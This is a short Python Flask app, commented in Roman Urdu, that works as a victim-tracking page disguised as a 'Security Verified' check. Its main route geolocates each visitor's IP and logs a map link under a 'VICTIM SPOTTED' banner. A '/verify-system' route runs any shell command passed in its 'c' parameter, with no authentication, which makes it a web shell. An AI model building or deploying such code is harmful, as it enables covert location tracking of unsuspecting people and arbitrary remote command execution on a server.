from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # 1. Asli IP nikalna
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # 2. Location API se data lena
        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        city = res.get('city', 'Karachi')
        lat = res.get('lat', '24.8607')
        lon = res.get('lon', '67.0011')
        
        # 3. Exact Map Link banana
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # 4. Logs mein data bhejna (Vercel Runtime Logs ke liye)
        print(f"\n--- [!!!] VICTIM SPOTTED [!!!] ---")
        print(f"IP: {user_ip} | City: {city}")
        print(f"Location: {map_link}\n")
        
        return f"<h2>Security Verified</h2><p>Connection: {user_ip}</p><p>City: {city}</p>"
    except:
        return "<h2>System Online</h2>"

@app.route('/verify-system')
def verify_system():
    # RCE System jo aapne test kiya tha
    cmd = request.args.get('c', 'ls')
    try:
        output = os.popen(cmd).read()
        return f"<h3>Console Output:</h3><pre>{output}</pre>"
    except:
        return "Access Denied"
